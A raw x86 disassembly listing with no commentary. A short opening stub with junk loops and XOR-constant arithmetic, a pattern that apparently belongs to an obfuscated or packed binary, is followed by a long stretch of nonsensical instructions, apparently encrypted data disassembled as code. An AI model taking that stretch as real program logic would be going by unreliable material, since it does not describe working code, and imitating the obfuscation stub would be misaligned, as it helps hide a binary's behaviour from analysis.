  4079a2:	or     edi,DWORD PTR ds:0x433763
  4079a8:	mov    DWORD PTR ds:0x4336ef,edi
  4079ae:	mov    edi,0xf89f2dad
  4079b3:	and    DWORD PTR ds:0x4336b3,0x0
  4079bd:	jmp    0x4079cf
  4079c2:	mov    esi,DWORD PTR ds:0x4336b3
  4079c8:	inc    esi
  4079c9:	mov    DWORD PTR ds:0x4336b3,esi
  4079cf:	cmp    DWORD PTR ds:0x4336b3,0x1e
  4079d6:	jae    0x4079f7
  4079dc:	cmp    DWORD PTR ds:0x4336b3,0x2c
  4079e3:	jne    0x4079f2
  4079e9:	push   DWORD PTR [ebp-0x28]
  4079ec:	call   DWORD PTR ds:0x4120c8
  4079f2:	jmp    0x4079c2
  4079f7:	mov    DWORD PTR [eax],edi
  4079f9:	mov    eax,DWORD PTR [ebp-0x14]
  4079fc:	mov    ebx,DWORD PTR [ebp-0x8]
  4079ff:	mov    ecx,0x7510853
  407a04:	xor    eax,ecx
  407a06:	mov    esi,0x32729a
  407a0b:	xor    ebx,ecx
  407a0d:	xor    edx,edx
  407a0f:	add    eax,esi
  407a11:	add    ebx,esi
  407a13:	div    ebx
  407a15:	mov    edx,DWORD PTR [ebp-0x20]
  407a18:	mov    DWORD PTR [ebp-0x2c],0x4ec5
  407a1f:	cmp    eax,DWORD PTR [edx]
  407a21:	je     0x40936a
  407a27:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407a2e:	lea    eax,[ebp-0xc]
  407a31:	mov    DWORD PTR [ebp-0x10],eax
  407a34:	mov    eax,DWORD PTR [ebp-0x10]
  407a37:	mov    edx,DWORD PTR [eax]
  407a39:	jmp    0x407daf
  407a3e:	sub    eax,0xb2df1e8f
  407a43:	imul   ebp,ebp,0x58ddbe5d
  407a49:	or     BYTE PTR [edx],bl
  407a4b:	pop    es
  407a4c:	and    ch,cl
  407a4e:	sub    esp,edx
  407a50:	jl     0x407ace
  407a52:	xlat   BYTE PTR ds:[ebx]
  407a53:	jns    0x407ad1
  407a55:	jl     0x407abd
  407a57:	out    0xc1,eax
  407a59:	ficom  WORD PTR [edx+0x8]
  407a5c:	mov    cl,0x5a
  407a5e:	mov    WORD PTR [ecx+0x3c],gs
  407a61:	das    
  407a62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a63:	cmp    esp,ecx
  407a65:	in     eax,dx
  407a66:	add    al,0xad
  407a68:	and    BYTE PTR [ebp-0x14],0xca
  407a6c:	pusha  
  407a6d:	jo     0x407a33
  407a6f:	add    DWORD PTR [ecx+ebx*8],esp
  407a72:	inc    eax
  407a73:	lahf   
  407a74:	fild   DWORD PTR [ebx+0x7e5c47e8]
  407a7a:	loopne 0x407a02
  407a7c:	nop
  407a7d:	out    dx,eax
  407a7e:	cs dec esi
  407a80:	adc    BYTE PTR [ecx+edx*4-0x3b94bb25],cl
  407a87:	adc    eax,DWORD PTR [esi-0x4ea5bb01]
  407a8d:	fimul  WORD PTR [edx+eax*8]
  407a90:	fist   DWORD PTR [ebx+0xec35472]
  407a96:	leave  
  407a97:	test   BYTE PTR [ebx+0x7],0xf1
  407a9b:	mov    ds:0xa5132159,al
  407aa0:	jecxz  0x407a46
  407aa2:	mov    WORD PTR [eax-0x6ea17113],cs
  407aa8:	or     DWORD PTR [eax+0x29],edx
  407aab:	jge    0x407b0d
  407aad:	adc    esi,ecx
  407aaf:	jmp    0xc4ca487c
  407ab4:	push   ss
  407ab5:	mov    ebp,0x74542ed4
  407aba:	int    0x1
  407abc:	test   DWORD PTR [edx],ebx
  407abe:	inc    edx
  407abf:	pop    ss
  407ac0:	cmp    dl,BYTE PTR [ecx+0x77e61f85]
  407ac6:	xor    eax,0x2a
  407ac9:	hlt    
  407aca:	out    0x9,eax
  407acc:	scas   al,BYTE PTR es:[edi]
  407acd:	test   BYTE PTR [edx-0x619ab47f],dh
  407ad3:	pushf  
  407ad4:	pop    ebp
  407ad5:	das    
  407ad6:	or     al,BYTE PTR [edi-0x1]
  407ad9:	mov    DWORD PTR [edx-0x7da0702a],ebp
  407adf:	mov    ecx,DWORD PTR [edx]
  407ae1:	cs loop 0x407aac
  407ae4:	jno    0x407aad
  407ae6:	and    eax,0x677f7370
  407aeb:	mov    dl,0xfe
  407aed:	sbb    dl,ah
  407aef:	mov    DWORD PTR [esi+0x41],esi
  407af2:	add    al,0x43
  407af4:	and    bh,BYTE PTR [esp+ebp*2+0x6db85a41]
  407afb:	pop    ebx
  407afc:	mov    es,WORD PTR [ebx]
  407afe:	icebp  
  407aff:	and    al,0x2e
  407b01:	push   cs
  407b02:	jmp    0x407ab7
  407b04:	jnp    0x407b4c
  407b06:	shr    BYTE PTR [ebx],1
  407b08:	fsub   QWORD PTR [esi]
  407b0a:	outs   dx,DWORD PTR ds:[esi]
  407b0b:	or     cl,BYTE PTR [edi-0x15]
  407b0e:	outs   dx,DWORD PTR ds:[esi]
  407b0f:	repz mov al,0x41
  407b12:	xchg   esp,eax
  407b13:	dec    eax
  407b14:	aaa    
  407b15:	ins    BYTE PTR es:[edi],dx
  407b16:	pop    esi
  407b17:	or     cl,dl
  407b19:	lods   al,BYTE PTR ds:[esi]
  407b1a:	mov    dl,0xa9
  407b1c:	jmp    0x407b62
  407b1e:	loopne 0x407b80
  407b20:	and    al,0x79
  407b22:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  407b24:	mov    esi,0x690b220f
  407b29:	cmp    eax,DWORD PTR [ecx+eax*1+0x66]
  407b2d:	or     ebx,DWORD PTR [ebx+0x5]
  407b30:	sbb    al,al
  407b32:	fldcw  WORD PTR [eax+edi*4]
  407b35:	sbb    eax,DWORD PTR ds:0xfc76b3e0
  407b3b:	jno    0x407b57
  407b3d:	rcl    BYTE PTR [esp+ebx*4-0x71f6d4f],1
  407b44:	ins    BYTE PTR es:[edi],dx
  407b45:	lea    ecx,[ebp-0x36]
  407b48:	jae    0x407bb8
  407b4a:	int3   
  407b4b:	mul    BYTE PTR es:[ecx-0x50]
  407b4f:	outs   dx,DWORD PTR ds:[esi]
  407b50:	lods   al,BYTE PTR ds:[esi]
  407b51:	pop    ds
  407b52:	inc    edx
  407b53:	outs   dx,BYTE PTR ds:[esi]
  407b54:	shl    ecx,cl
  407b56:	xor    DWORD PTR [edx],edi
  407b58:	xor    al,0x55
  407b5a:	cmp    BYTE PTR ds:0xa498b27a,cl
  407b60:	push   ecx
  407b61:	pop    ebp
  407b62:	dec    eax
  407b63:	sbb    ebx,ebp
  407b65:	inc    edi
  407b66:	mov    ebx,0x81ef881b
  407b6b:	pop    edx
  407b6c:	inc    ecx
  407b6d:	or     al,0x7b
  407b6f:	popa   
  407b70:	adc    DWORD PTR [ebp+0x7beba7c3],esi
  407b76:	sbb    al,0xd3
  407b78:	mov    bl,0x2c
  407b7a:	fsubr  QWORD PTR [edx-0x42]
  407b7d:	shl    BYTE PTR [ebx],0xdc
  407b80:	push   edi
  407b81:	pusha  
  407b82:	pop    esi
  407b83:	and    BYTE PTR [esi+0x1a],ah
  407b86:	in     eax,0xb0
  407b88:	addr16 jne 0x407b28
  407b8b:	(bad)  
  407b8d:	jae    0x407bbb
  407b8f:	add    BYTE PTR [eax-0x5b232ef5],0x44
  407b96:	test   bh,dh
  407b98:	cs repz test eax,0xd58930fc
  407b9f:	cmp    al,0xf6
  407ba1:	xchg   ebx,eax
  407ba2:	pop    edi
  407ba3:	outs   dx,BYTE PTR ds:[esi]
  407ba4:	or     edx,0x71f4ed7d
  407baa:	dec    esp
  407bab:	(bad)  
  407bac:	push   ebp
  407bad:	ins    DWORD PTR es:[edi],dx
  407bae:	fldenv [edx-0x7e348423]
  407bb4:	(bad)  
  407bb6:	dec    ebp
  407bb7:	mov    eax,ds:0x9902096f
  407bbc:	jmp    0x252a43f9
  407bc1:	mov    ebp,0xa721dd80
  407bc6:	popa   
  407bc7:	jno    0x407ba8
  407bc9:	ins    DWORD PTR es:[edi],dx
  407bca:	rcl    DWORD PTR [esi+ebp*8-0x21],1
  407bce:	add    DWORD PTR [ebp+ebx*4+0x6af0d15e],ecx
  407bd5:	cld    
  407bd6:	xor    BYTE PTR [edx-0x2a],ah
  407bd9:	push   ebp
  407bda:	push   ecx
  407bdb:	xchg   edi,eax
  407bdc:	xor    DWORD PTR [edx],ecx
  407bde:	jl     0x407b88
  407be0:	lods   al,BYTE PTR ds:[esi]
  407be1:	add    BYTE PTR [ebp-0x16],al
  407be4:	cmp    DWORD PTR ds:0xc519b105,ebp
  407bea:	xor    DWORD PTR [eax-0x62],0xffffffb9
  407bee:	in     al,0xa2
  407bf0:	xchg   ebp,eax
  407bf1:	setge  BYTE PTR [esi+0x619455b1]
  407bf8:	fs clc 
  407bfa:	scas   al,BYTE PTR es:[edi]
  407bfb:	lea    ebp,[ebx+esi*4]
  407bfe:	push   0x9e572fd0
  407c03:	mov    ch,0x96
  407c05:	arpl   WORD PTR [eax],bx
  407c07:	sbb    al,0xf5
  407c09:	pusha  
  407c0a:	sti    
  407c0b:	pop    ss
  407c0c:	(bad)  
  407c0d:	xchg   esp,eax
  407c0e:	sbb    cl,cl
  407c10:	out    dx,eax
  407c11:	aas    
  407c12:	jmp    0x407c6e
  407c14:	cmp    DWORD PTR [edx],ebp
  407c16:	daa    
  407c17:	inc    ebp
  407c18:	jns    0x407c50
  407c1a:	push   0x94090639
  407c1f:	test   BYTE PTR [ecx+0x134adec5],al
  407c25:	cld    
  407c26:	int3   
  407c27:	enter  0x71cc,0xfc
  407c2b:	sub    al,0x8a
  407c2d:	test   BYTE PTR [esi],bh
  407c2f:	test   eax,0x364599de
  407c34:	lds    esi,FWORD PTR [edi+0x30901d5c]
  407c3a:	sahf   
  407c3b:	leave  
  407c3c:	jno    0x407c7a
  407c3e:	cmp    esi,DWORD PTR [eax+eax*4+0x20]
  407c42:	lods   al,BYTE PTR ds:[esi]
  407c43:	idiv   DWORD PTR ds:0x4dec1835
  407c49:	add    eax,0x20d22d17
  407c4e:	xchg   esi,ecx
  407c50:	test   DWORD PTR [edx-0x25],0xafca71f0
  407c57:	sti    
  407c58:	jnp    0x407c46
  407c5a:	leave  
  407c5b:	ror    BYTE PTR [ecx-0x5c],0x36
  407c5f:	ins    BYTE PTR es:[edi],dx
  407c60:	xor    eax,DWORD PTR ds:0xe21aa61c
  407c66:	sahf   
  407c67:	xlat   BYTE PTR ds:[ebx]
  407c68:	es sbb dl,bh
  407c6b:	or     ah,bh
  407c6d:	pushf  
  407c6e:	cmp    al,0x9c
  407c71:	mov    dl,ah
  407c73:	sub    al,BYTE PTR [edx]
  407c75:	test   DWORD PTR [ebx+0x2],esp
  407c78:	jae    0x407cef
  407c7a:	adc    cl,BYTE PTR [ebp+0x7b]
  407c7d:	mov    eax,esi
  407c7f:	sbb    al,0x8f
  407c81:	inc    ecx
  407c82:	mov    BYTE PTR [ecx+0x46],ah
  407c85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c86:	mov    WORD PTR [esi-0x14ebd4d1],cs
  407c8c:	sbb    edi,DWORD PTR [eax+0x4254d30b]
  407c92:	push   ss
  407c93:	mov    edi,0x50e23ce9
  407c98:	jmp    FWORD PTR [esi+eax*8-0xcc49806]
  407c9f:	fcom   QWORD PTR [ecx-0x46f6bc82]
  407ca5:	dec    ebp
  407ca6:	leave  
  407ca7:	sti    
  407ca8:	clc    
  407ca9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407caa:	add    DWORD PTR [ebx-0x40],edx
  407cad:	cmc    
  407cae:	push   esp
  407caf:	sbb    BYTE PTR [esi+0x76],0xdc
  407cb3:	loopne 0x407c36
  407cb5:	daa    
  407cb6:	aam    0xd3
  407cb8:	xchg   DWORD PTR [eax],esi
  407cba:	ret    
  407cbb:	inc    edx
  407cbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cbd:	xchg   edi,eax
  407cbe:	inc    eax
  407cbf:	leave  
  407cc0:	fwait
  407cc1:	cmp    bh,BYTE PTR [eax-0x1240a113]
  407cc7:	push   ds
  407cc8:	xor    esp,edi
  407cca:	popf   
  407ccb:	inc    eax
  407ccc:	lea    ebp,[esi+0x6f]
  407ccf:	push   ebx
  407cd0:	pop    ecx
  407cd1:	or     DWORD PTR [ecx-0xc22b63d],ebx
  407cd7:	xor    al,ch
  407cd9:	lods   eax,DWORD PTR ds:[esi]
  407cda:	data16 and cl,bl
  407cdd:	jle    0x407d5b
  407cdf:	pop    ss
  407ce0:	mov    ebx,0x94939807
  407ce5:	idiv   BYTE PTR [eax-0x7c2bd01c]
  407ceb:	and    bh,BYTE PTR [edx]
  407ced:	clc    
  407cee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cef:	or     al,0x24
  407cf1:	mov    bl,0x4e
  407cf3:	rcr    BYTE PTR [edi-0x23],0xd1
  407cf7:	ficom  DWORD PTR [edx-0xb933933]
  407cfd:	sbb    ecx,DWORD PTR [ecx-0x1a41d816]
  407d03:	jns    0x407cf2
  407d05:	lahf   
  407d06:	xor    BYTE PTR [eax+0x7d55b5c9],bh
  407d0c:	dec    ecx
  407d0d:	adc    DWORD PTR ds:0xf4129ac9,0xacee87ed
  407d17:	shl    DWORD PTR [esp+esi*2],0xa
  407d1b:	outs   dx,BYTE PTR ds:[esi]
  407d1c:	fnsetpm(287 only) 
  407d1e:	lods   al,BYTE PTR ds:[esi]
  407d1f:	jo     0x407ce4
  407d21:	add    ebp,DWORD PTR [ebx]
  407d23:	rcl    DWORD PTR [edx],0x66
  407d26:	hlt    
  407d27:	inc    ebp
  407d28:	fwait
  407d29:	mov    dl,dl
  407d2b:	pop    esi
  407d2c:	mov    ds:0x8f701764,al
  407d31:	jl     0x407d0f
  407d33:	sub    eax,0xe04924a9
  407d38:	and    edi,DWORD PTR ds:0x86371c37
  407d3e:	dec    ebx
  407d3f:	mov    ch,0xaf
  407d41:	sub    cl,0xf9
  407d44:	push   ss
  407d45:	inc    edi
  407d46:	mov    ch,0x15
  407d48:	sbb    cl,BYTE PTR [eax+ecx*8-0x1a523cd2]
  407d4f:	call   FWORD PTR [esi+0x2d]
  407d52:	ja     0x407d7d
  407d54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d55:	jno    0x407ce5
  407d57:	inc    esp
  407d58:	jmp    0x90db69a7
  407d5d:	rcr    BYTE PTR [ebx-0x72],1
  407d60:	xchg   ebp,eax
  407d61:	push   0xffffffad
  407d63:	jl     0x407d17
  407d65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d66:	(bad)  
  407d67:	lahf   
  407d68:	inc    edi
  407d69:	add    al,0xec
  407d6b:	popf   
  407d6c:	mov    ebx,0xda551598
  407d71:	in     al,0x52
  407d73:	sub    al,0xb9
  407d75:	xchg   DWORD PTR [eax],edx
  407d77:	inc    ebp
  407d78:	xchg   edx,eax
  407d79:	pop    ebx
  407d7a:	pusha  
  407d7b:	or     esp,edi
  407d7d:	and    eax,DWORD PTR [eax+0x21]
  407d80:	(bad)  
  407d81:	sub    al,0x57
  407d83:	pushf  
  407d84:	push   0xfffffff1
  407d86:	dec    ebx
  407d87:	jb     0x407d64
  407d89:	jno    0x407dde
  407d8b:	shl    DWORD PTR [edx+edx*2+0x3585c4c8],1
  407d92:	dec    edi
  407d93:	test   eax,0x5d1c6bd9
  407d98:	stos   BYTE PTR es:[edi],al
  407d99:	rcl    DWORD PTR [ebp+0x5363687e],0x19
  407da0:	pop    ds
  407da1:	or     bh,bh
  407da3:	cdq    
  407da4:	push   ds
  407da5:	lahf   
  407da6:	sub    dh,BYTE PTR [edi]
  407da8:	xor    eax,0xdc962df3
  407dad:	ror    DWORD PTR [esi-0x56172d97],1
  407db3:	sahf   
  407db4:	clc    
  407db5:	mov    DWORD PTR [eax],edx
  407db7:	mov    eax,DWORD PTR [ebp-0xc]
  407dba:	cmp    eax,0x58133098
  407dbf:	jmp    0x408135
  407dc4:	cwde   
  407dc5:	mov    eax,ds:0x5b4dbc42
  407dca:	mov    ds:0x4fdb206d,al
  407dcf:	or     bl,BYTE PTR [ebp-0x7f9246bd]
  407dd5:	sar    DWORD PTR [esp+edi*2-0x29],1
  407dd9:	jns    0x407e57
  407ddb:	jl     0x407e58
  407ddd:	lea    esi,[ebp+0x3f]
  407de0:	popa   
  407de1:	xchg   DWORD PTR [edx-0x67],ecx
  407de4:	cmc    
  407de5:	mov    ecx,0x29914cfa
  407dea:	pop    ebp
  407deb:	sbb    esi,DWORD PTR [edx+eiz*4+0x3ca2c125]
  407df2:	into   
  407df3:	out    dx,al
  407df4:	pop    eax
  407df5:	and    al,0x43
  407df7:	xchg   esp,eax
  407df8:	fwait
  407df9:	imul   ebx,DWORD PTR [edi+0x56],0xf28293e5
  407e00:	test   BYTE PTR [ebx+0x7d],ah
  407e03:	pop    esp
  407e04:	aad    0x46
  407e06:	xchg   ebx,eax
  407e07:	nop
  407e08:	jmp    0x9417cc99
  407e0d:	into   
  407e0e:	in     eax,0x43
  407e10:	in     eax,dx
  407e11:	jle    0x407e57
  407e13:	xor    edx,ecx
  407e15:	hlt    
  407e16:	pop    edi
  407e17:	(bad)  
  407e18:	int3   
  407e19:	je     0x407e8d
  407e1b:	cmc    
  407e1c:	retf   
  407e1d:	or     cl,BYTE PTR [esi+ebp*8+0x5ca88a20]
  407e24:	xor    eax,esp
  407e26:	xor    eax,edx
  407e28:	hlt    
  407e29:	dec    ecx
  407e2a:	shl    DWORD PTR [ebp+0x3b],cl
  407e2d:	je     0x407e0d
  407e2f:	dec    ebp
  407e30:	out    0x60,al
  407e32:	mov    dl,0x2a
  407e34:	mov    DWORD PTR [eax],ebp
  407e36:	ins    DWORD PTR es:[edi],dx
  407e37:	test   BYTE PTR [edx-0x70b4f084],ah
  407e3d:	cwde   
  407e3e:	or     al,0x2c
  407e40:	mov    ah,0xfe
  407e42:	cmp    al,bl
  407e44:	outs   dx,BYTE PTR ds:[esi]
  407e45:	jno    0x407e62
  407e47:	in     al,dx
  407e48:	mov    ah,0xf8
  407e4a:	cmp    esp,esi
  407e4c:	push   ds
  407e4d:	sbb    ah,BYTE PTR [edi]
  407e4f:	pop    edi
  407e50:	jecxz  0x407e15
  407e52:	sub    BYTE PTR [esi],0x6e
  407e55:	ja     0x407e81
  407e57:	retf   
  407e58:	add    edi,eax
  407e5a:	out    dx,eax
  407e5b:	test   DWORD PTR [edx],ebp
  407e5d:	(bad)  
  407e5f:	dec    eax
  407e60:	pop    esp
  407e61:	fidiv  DWORD PTR [ebp+ebx*8+0x68]
  407e65:	add    DWORD PTR [eiz*8-0x1b889e58],esi
  407e6c:	aas    
  407e6d:	es mov ecx,0xec4652d
  407e73:	or     DWORD PTR [ecx-0x3e3b4321],edx
  407e79:	sub    BYTE PTR [ecx-0x365fb30d],0x2e
  407e80:	jecxz  0x407eda
  407e82:	daa    
  407e83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e84:	jmp    0x407e3f
  407e86:	sbb    ch,BYTE PTR [edi+0x1b]
  407e89:	jns    0x407ed9
  407e8b:	mov    bl,0x54
  407e8d:	adc    al,0xf5
  407e8f:	xchg   esi,eax
  407e90:	sub    al,0xe3
  407e92:	push   ebp
  407e93:	repz xchg ebp,eax
  407e95:	pop    edx
  407e96:	mov    ch,0x80
  407e98:	dec    ebp
  407e99:	test   al,0x15
  407e9b:	jmp    0x20d2:0xc74ab54
  407ea2:	loopne 0x407ed4
  407ea4:	inc    esi
  407ea5:	push   0x12
  407ea7:	sub    cl,al
  407ea9:	cmp    ch,BYTE PTR [ebp+edi*2-0x6d]
  407ead:	rol    BYTE PTR gs:[eax-0x49157b19],cl
  407eb4:	inc    edx
  407eb5:	xchg   edx,eax
  407eb6:	sub    eax,0x33f4ce5b
  407ebb:	jp     0x407e42
  407ebd:	aas    
  407ebe:	sbb    DWORD PTR [edx+0x50c6cf42],edi
  407ec4:	or     ebp,DWORD PTR [edi+0x29]
  407ec7:	(bad)  
  407ec8:	xchg   esi,eax
  407ec9:	ja     0x407e5a
  407ecb:	enter  0x72b8,0x94
  407ecf:	rol    ebx,0x3b
  407ed2:	inc    ebp
  407ed3:	outs   dx,DWORD PTR ds:[esi]
  407ed4:	(bad)  
  407ed5:	in     eax,0xaf
  407ed7:	scas   eax,DWORD PTR es:[edi]
  407ed8:	and    DWORD PTR [ebp+edx*4-0xc],eax
  407edc:	pushf  
  407edd:	sti    
  407ede:	add    edx,DWORD PTR [edx]
  407ee0:	cmp    eax,0x6a8265a9
  407ee5:	popf   
  407ee6:	fsubr  st(2),st
  407ee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ee9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407eea:	add    BYTE PTR [ebx+ebx*4],ch
  407eed:	cwde   
  407eee:	push   edx
  407eef:	lea    ebx,[edi+0x1218f67d]
  407ef5:	pop    ds
  407ef6:	push   eax
  407ef7:	pop    esp
  407ef8:	and    al,0x4a
  407efa:	or     eax,0x4ea502e2
  407eff:	test   DWORD PTR [bx+di],edx
  407f02:	outs   dx,BYTE PTR ds:[esi]
  407f03:	ins    BYTE PTR es:[edi],dx
  407f04:	pop    ebp
  407f05:	cmovle esp,ecx
  407f08:	arpl   WORD PTR [ebx-0x607a2e9d],cx
  407f0e:	or     dl,bl
  407f10:	test   al,0x72
  407f12:	sub    esp,DWORD PTR [ebx+0x235622fc]
  407f18:	shr    DWORD PTR [eax],cl
  407f1a:	out    0xf6,al
  407f1c:	sahf   
  407f1d:	clc    
  407f1e:	cmp    BYTE PTR [eax-0x124a8894],ch
  407f24:	push   edx
  407f25:	pop    es
  407f26:	and    eax,ecx
  407f28:	add    ebp,DWORD PTR [eax-0x4d]
  407f2b:	or     ebx,DWORD PTR [ebp-0x7e]
  407f2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f2f:	or     DWORD PTR [edx-0x68],ebx
  407f32:	mov    WORD PTR [ebx],ds
  407f34:	(bad)  
  407f35:	push   ecx
  407f36:	and    edx,DWORD PTR [ebp-0x6a]
  407f39:	mov    bl,0x90
  407f3b:	(bad)
  407f3e:	cmp    bh,cl
  407f40:	cmp    al,0x2f
  407f42:	mov    BYTE PTR [ebp+edx*1+0x51],dh
  407f46:	xchg   ecx,eax
  407f47:	adc    DWORD PTR [eax-0x47],ebp
  407f4a:	out    dx,al
  407f4b:	mov    cl,0x5e
  407f4d:	retf   
  407f4e:	test   BYTE PTR [ebp-0x54967289],0x21
  407f55:	aad    0xa4
  407f57:	inc    bp
  407f59:	xchg   edi,eax
  407f5a:	gs call 0x4429:0xc33a6d8c
  407f62:	rol    eax,0xa7
  407f65:	es jg  0x407f35
  407f68:	in     al,0x91
  407f6a:	lahf   
  407f6b:	adc    DWORD PTR [ecx-0x4500dc0a],ecx
  407f71:	or     al,0x52
  407f73:	adc    eax,0x613c8d2b
  407f78:	push   cs
  407f79:	mov    edi,0x8ed3c99a
  407f7e:	or     cl,BYTE PTR [edx-0x52]
  407f81:	sahf   
  407f82:	ss hlt 
  407f84:	or     ecx,DWORD PTR [edi-0x25708a13]
  407f8a:	sti    
  407f8b:	cmp    ebp,DWORD PTR [edx+edx*8]
  407f8e:	adc    ch,BYTE PTR [edi-0x3ddc7c9b]
  407f94:	add    dh,BYTE PTR [eax]
  407f96:	adc    al,BYTE PTR [esi-0x56]
  407f99:	lods   al,BYTE PTR ds:[esi]
  407f9a:	(bad)  [bp+si+0x1a]
  407f9e:	or     al,BYTE PTR [ebp+eax*1+0x11]
  407fa2:	sbb    BYTE PTR [ecx+0x45a50588],0x63
  407fa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407faa:	mov    ah,0x6e
  407fac:	imul   edx,DWORD PTR [ecx-0x46ba803d],0x45
  407fb3:	sub    eax,0x6b22faf7
  407fb8:	pop    ecx
  407fb9:	test   edi,ebp
  407fbb:	mov    BYTE PTR [esi+0x4a],bh
  407fbe:	cmp    DWORD PTR [si-0x37],esi
  407fc2:	scas   eax,DWORD PTR es:[edi]
  407fc3:	xor    BYTE PTR [esi+ebp*1+0xe],dh
  407fc7:	pop    ss
  407fc8:	sbb    DWORD PTR [esi-0x15],eax
  407fcb:	cmp    dl,BYTE PTR [ecx]
  407fcd:	pop    esp
  407fce:	into   
  407fcf:	inc    ecx
  407fd0:	and    al,0x32
  407fd2:	in     eax,dx
  407fd3:	xor    esp,DWORD PTR [ecx-0x69b29265]
  407fd9:	mov    ds:0xd37e8def,al
  407fde:	call   0x1d86:0xf073c09f
  407fe5:	pop    esi
  407fe6:	mov    eax,ds:0xdc4386f5
  407feb:	cmp    ch,ch
  407fed:	rcl    DWORD PTR [edi+0x18748a6],1
  407ff3:	ins    DWORD PTR es:[edi],dx
  407ff4:	cs push edx
  407ff6:	cmp    cl,ch
  407ff8:	(bad)  
  407ffa:	sbb    bl,cl
  407ffc:	in     al,dx
  407ffd:	popf   
  407ffe:	popa   
  407fff:	lock dec edx
  408001:	dec    esi
  408002:	adc    eax,0x70722a9c
  408007:	int    0x9
  408009:	out    0x1c,al
  40800b:	adc    DWORD PTR [esi],ecx
  40800d:	cmp    BYTE PTR [ebx+0x34],bh
  408010:	mov    ah,0x3
  408012:	push   esi
  408013:	mov    BYTE PTR [ebx],dl
  408015:	out    dx,eax
  408016:	cmp    eax,0xa07eb534
  40801b:	mov    eax,0x38a0a928
  408020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408021:	(bad)  
  408022:	stos   DWORD PTR es:[edi],eax
  408023:	jp     0x408043
  408025:	mov    cl,0x4d
  408027:	add    ebp,ebx
  408029:	dec    ebp
  40802a:	xchg   BYTE PTR [ebp+0x578bc7d],bl
  408030:	out    dx,eax
  408031:	dec    ebx
  408032:	ficomp DWORD PTR [eax]
  408034:	jb     0x407ff9
  408036:	dec    ebp
  408037:	in     al,dx
  408038:	setle  BYTE PTR [ebx]
  40803b:	jmp    0xf8d3:0xc5f5f510
  408042:	pop    eax
  408043:	add    al,0x5c
  408045:	rol    DWORD PTR [eax],1
  408047:	push   ebx
  408048:	jmp    0x8a0d:0x1a94d0e2
  40804f:	mov    edi,0x7e295203
  408054:	test   BYTE PTR [edi+esi*1],bh
  408057:	mov    edx,0xa7bb42d9
  40805c:	mov    dl,0x4f
  40805e:	jge    0x407feb
  408060:	or     edi,ebx
  408062:	mov    dl,0x13
  408064:	jecxz  0x408023
  408066:	sub    ah,BYTE PTR [edi]
  408068:	mov    bh,0x47
  40806a:	fidiv  WORD PTR [ebp-0x3d]
  40806d:	in     eax,dx
  40806e:	sbb    ecx,DWORD PTR [ebx-0x3b050ad2]
  408074:	les    ebp,FWORD PTR [edx-0x7a]
  408077:	cwde   
  408078:	push   cs
  408079:	pusha  
  40807a:	push   eax
  40807b:	outs   dx,DWORD PTR ds:[esi]
  40807c:	inc    esi
  40807d:	pop    edx
  40807e:	xchg   esi,eax
  40807f:	jns    0x408036
  408081:	cmp    DWORD PTR [edi],ebx
  408083:	cmp    DWORD PTR [ebx-0x4bb906bf],0x8c3bb745
  40808d:	jl     0x40802a
  40808f:	imul   DWORD PTR [eax+0x69]
  408092:	sbb    al,0x92
  408094:	sub    al,BYTE PTR [eax-0x55fe7209]
  40809a:	pushf  
  40809b:	ret    0x5e67
  40809e:	int    0xee
  4080a0:	pop    edx
  4080a1:	dec    edx
  4080a2:	ret    
  4080a3:	enter  0x7173,0x3a
  4080a7:	mov    eax,ds:0x205caf0b
  4080ac:	and    al,0xb3
  4080ae:	jae    0x408096
  4080b0:	jb     0x4080ad
  4080b2:	push   edx
  4080b3:	iret   
  4080b4:	not    BYTE PTR ds:0x1845cda0
  4080ba:	ins    DWORD PTR es:[edi],dx
  4080bb:	es sti 
  4080bd:	push   0xeef1943b
  4080c2:	call   0x5725:0x12db4744
  4080c9:	in     eax,0xb0
  4080cb:	ret    
  4080cc:	xor    bl,BYTE PTR [ecx+edx*2+0x3b]
  4080d0:	sbb    eax,0x669cb202
  4080d5:	or     eax,0xea99dfb
  4080da:	xchg   DWORD PTR [esi],edx
  4080dc:	mov    esi,DWORD PTR [esi]
  4080de:	and    al,0x84
  4080e0:	lods   eax,DWORD PTR ds:[esi]
  4080e1:	inc    DWORD PTR [edx+eax*1+0x14]
  4080e5:	repnz mov bh,0xb0
  4080e8:	(bad)  
  4080e9:	rcr    edx,cl
  4080eb:	pusha  
  4080ec:	mov    ds:0xe82e41e3,eax
  4080f1:	enter  0xd404,0xe
  4080f5:	jmp    0xdc05b0ed
  4080fa:	addr16 push es
  4080fc:	sbb    eax,0xb294ff8d
  408101:	inc    ebp
  408102:	mov    eax,ebx
  408104:	mov    ebx,0x2d17852f
  408109:	sbb    DWORD PTR [edx-0x50],ebx
  40810c:	in     eax,0x7f
  40810e:	jmp    0xcfd024b0
  408113:	mov    al,ds:0x6a93e2bd
  408118:	std    
  408119:	rcl    ah,1
  40811b:	fnstcw WORD PTR [eax+0x4deee716]
  408121:	aad    0x8b
  408123:	pusha  
  408124:	fwait
  408125:	dec    esp
  408126:	fwait
  408127:	cmp    esi,DWORD PTR [edi]
  408129:	scas   al,BYTE PTR es:[edi]
  40812a:	pop    edx
  40812b:	jbe    0x40818c
  40812d:	push   esp
  40812e:	xchg   ecx,eax
  40812f:	test   ah,dl
  408131:	sub    DWORD PTR [edi+0x46],esp
  408134:	fmul   DWORD PTR [edi]
  408136:	test   BYTE PTR [ebp-0x74fffffd],cl
  40813c:	inc    ebp
  40813d:	in     al,0x81
  40813f:	or     BYTE PTR [eax-0x169f8ae4],bl
  408145:	jno    0x40814a
  408147:	add    BYTE PTR [eax],al
  408149:	pop    edx
  40814a:	jns    0x4080ea
